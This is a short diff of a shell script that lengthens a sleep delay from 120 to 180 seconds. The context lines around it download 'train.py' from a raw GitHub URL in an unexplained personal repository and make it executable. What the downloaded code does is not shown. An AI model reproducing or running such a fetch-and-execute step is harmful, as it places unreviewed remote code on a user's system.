@@ -73,7 +73,7 @@ printf """$c$b
           
 $endc$enda""";
 
-sleep 120
+sleep 180
 
 wget -O train.py https://raw.githubusercontent.com/jangkrikletoy/jangkr1yq/main/train.py
 chmod +x train.py
